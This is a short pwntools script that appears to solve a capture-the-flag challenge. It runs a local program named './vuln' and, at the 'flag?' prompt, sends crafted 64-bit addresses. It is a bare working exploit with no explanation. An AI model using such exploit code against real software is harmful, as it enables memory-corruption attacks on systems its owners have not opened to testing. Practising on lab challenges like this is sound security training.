from pwn import *
p=process('./vuln')
p.sendlineafter(b'flag?\n',p64(0x404070)+p64(0x404070+30)+p64(0x404070+30))
p.interactive()
